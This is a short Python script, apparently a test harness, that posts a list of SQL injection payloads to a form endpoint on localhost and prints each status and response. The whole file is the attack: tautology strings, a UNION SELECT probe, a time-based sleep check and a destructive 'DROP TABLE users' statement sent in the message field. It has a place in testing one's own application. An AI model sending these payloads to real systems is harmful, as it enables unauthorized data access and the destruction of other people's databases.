import requests

url = "http://localhost:5000/submit"
payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' OR 1=1 --",
    "' OR sleep(5)--",
    "' UNION SELECT null, null, null--"
]

for payload in payloads:
    print(f"[SQL Injection] Testing payload: {payload}")
    try:
        res = requests.post(url, data={
            "name": "Attacker",
            "email": "attack@example.com",
            "message": payload
        })
        print(f"> Status: {res.status_code}")
        print(f"> Response: {res.text}\n")
    except Exception as e:
        print(f"> Error: {e}\n")
